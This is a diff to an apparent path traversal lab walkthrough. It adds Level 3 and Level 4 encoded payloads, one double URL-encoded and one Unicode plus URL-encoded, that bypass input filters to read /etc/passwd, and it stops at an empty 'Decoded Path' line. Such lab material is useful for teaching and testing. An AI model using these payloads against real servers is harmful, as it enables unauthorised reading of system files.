@@ -36,4 +36,11 @@ _This leverages how `....//` is interpreted as `../` after normalization._
 ### 🔒 Level 3 — Blacklisted Patterns (Double Encoding Bypass)
 The application decodes the input twice. Blacklists are applied only after the first decoding pass (common in Spring Boot apps).
 
-- **Payload**:
+- **Payload**: `%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564`
+
+### 🌐 Level 4 — Unicode + URL Encoding Bypass
+Strict sanitization blocks normal encoding. Use Unicode with URL encoding.
+
+- **Payload**: `%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%36%35%5c%75%30%30%37%34%5c%75%30%30%36%33%5c%75%30%30%32%66%5c%75%30%30%37%30%5c%75%30%30%36%31%5c%75%30%30%37%33%5c%75%30%30%37%33%5c%75%30%30%37%37%5c%75%30%30%36%34`
+
+- **Decoded Path**:
